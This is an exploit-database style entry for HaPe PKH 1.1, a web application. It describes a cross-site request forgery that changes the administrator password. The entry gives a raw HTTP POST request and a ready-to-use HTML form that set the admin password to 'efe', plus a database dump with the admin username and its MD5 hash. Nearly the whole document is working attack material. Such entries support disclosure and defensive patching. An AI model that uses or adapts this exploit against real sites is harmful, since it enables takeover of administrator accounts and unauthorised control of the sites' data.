@@ -1,0 +1,55 @@
+# Exploit Title: HaPe PKH 1.1 - Cross-Site Request Forgery (Update Admin)
+# Dork: N/A
+# Date: 2018-10-12
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.sitejo.id
+# Software Link: https://sourceforge.net/projects/hape-pkh/files/latest/download
+# Version: 1.1 
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Description
+# The administrator password can be changed.
+
+POST /hape-pkh/admin/modul/mod_user/aksi_user.php?module=user&act=update HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------265001916915724
+Content-Length: 350
+Cookie: PHPSESSID=0msajnig4du85odc3hanq1dil2
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------265001916915724
+Content-Disposition: form-data; name="id_user"
+1
+-----------------------------265001916915724
+Content-Disposition: form-data; name="password"
+efe
+-----------------------------265001916915724
+Content-Disposition: form-data; name="level"
+admin
+-----------------------------265001916915724--
+
+/* `exploitdb`.`admin` */
+$admin = array(
+  array('id_user' => '1','nama_lengkap' => '','jk' => '','tempat' => '','tl' => '0000-00-00','alamat' => '','id_desa' => '','no_telp' => '','email' => '','username' => 'admin','password' => '5ebf8364d17c8df7e4afd586c24f84a0','level' => 'admin','blokir' => '','foto' => '76dsc00404.jpg')
+);
+efe = 5ebf8364d17c8df7e4afd586c24f84a0
+
+# PoC:
+# 2)
+
+<form method="POST" enctype="multipart/form-data" action="http://localhost/hape-pkh/admin/modul/mod_user/aksi_user.php?module=user&act=update">
+<input name="id_user" value="1" type="hidden">
+<input name="username" value="admin" disabled=""> 
+<input class="input3" size="30" name="password" type="text" value="efe">
+<input name="level" value="admin" checked="" type="radio">
+<input value="Update" type="submit">
+</form>
